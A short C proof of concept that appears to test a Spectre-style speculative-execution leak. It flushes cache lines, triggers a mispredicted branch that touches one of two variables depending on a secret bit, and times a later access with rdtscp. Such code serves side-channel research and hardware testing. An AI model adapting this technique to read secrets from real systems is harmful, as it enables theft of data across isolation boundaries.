#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#define SIZE 256
#define STRIDE 1024
uint8_t array[SIZE * STRIDE] __attribute__((aligned(4096)));
uint64_t global_variable1 __attribute__((aligned(4096))) = 0xff;
uint64_t global_variable2 __attribute__((aligned(4096))) = 0xff;
int check_public __attribute__((aligned(4096))) = 100;
#define memory_barrier asm volatile ("sfence;\nlfence;\nlfence");
#define clflush(a) asm volatile ("clflush 0(%0)": : "r" (&a):);

void __attribute__((aligned(4096))) 
test1(int secret, int isPublic)
{
  for (volatile int i = 0; i < 200; i++);
  memory_barrier

  if (isPublic < array[0x2 * STRIDE]) {
    if (secret) {
      *(volatile uint64_t *)&global_variable1;
    }
    else {
      *(volatile uint64_t *)&global_variable2;
    }
  }
}

int main(int argc, char *argv[])
{
  int secret = 0;
  if ((atoi(argv[1])%2) == 0)
	secret = 0;
  else
	secret = 1;
  
  // Initialize the array and memory
  for (int i = 0; i < sizeof(array); i++)
    array[i] = 0x0;
  array[0x2 * STRIDE] = 10;

  unsigned int dummy = 0;
  memory_barrier
  
  // Flush global_variable
  clflush(global_variable1);
  clflush(global_variable2);
  clflush(check_public);
  clflush(array[0x2 * STRIDE]);
  memory_barrier

  // Leak 
  test1(secret, check_public);
  memory_barrier
  
  // Test
  uint64_t time = __rdtscp(&dummy);
  *(volatile uint64_t*)&global_variable2;
  time = __rdtscp(&dummy) - time;

  memory_barrier
  printf("Time results: %ld\n", time );
}
